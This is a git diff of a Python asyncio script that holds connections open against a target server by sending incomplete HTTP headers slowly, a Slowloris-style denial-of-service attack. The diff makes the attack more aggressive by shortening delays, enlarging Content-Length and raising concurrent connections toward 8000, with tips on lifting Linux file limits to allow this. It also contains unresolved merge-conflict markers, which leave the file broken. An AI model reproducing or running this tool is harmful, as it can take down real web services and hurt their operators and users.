@@ -6,14 +6,18 @@ import random
 import sys
 
 # Delay factor, some noise is added.
-DELAY = 5
+DELAY = 1
 
 # Number of concurrent requests that are happening, threads are not used.
 # To get this above 1024 on linux, you have to edit /etc/security/limits.conf
 # and add a line like vita soft nofile 2000
 # and vita hard nofile 40000
 # You can check the status of these limits with ulimit -Hn and ulimit -Sn
+<<<<<<< HEAD
 CONCURRENT_REQUESTS = 1000
+=======
+CONCURRENT_REQUESTS = 8000 
+>>>>>>> 0f992af6e10a782b7cd70bbc382c45b179c47c0e
 
 def fl():
     sys.stdout.flush()
@@ -35,14 +39,13 @@ async def papercut(target, i):
         soc.send(
                 ('GET / HTTP/1.1\r\n' + 
                 'Connection: keep-alive\r\n' + 
-                'Content-Length: 255\r\n').encode())
-        await asyncio.sleep(DELAY/2)
-        try: 
+                'Content-Length: 10000\r\n').encode())
+        try:
             for v in range(20):
+                await asyncio.sleep(random.random()*DELAY)
                 print('C', end='')
                 fl()
                 soc.send(('adsf' + str(v) + ": 5\r\n").encode())
-                await asyncio.sleep(DELAY/2 + random.random())
         except BrokenPipeError:
             print('B', end='')
             fl()
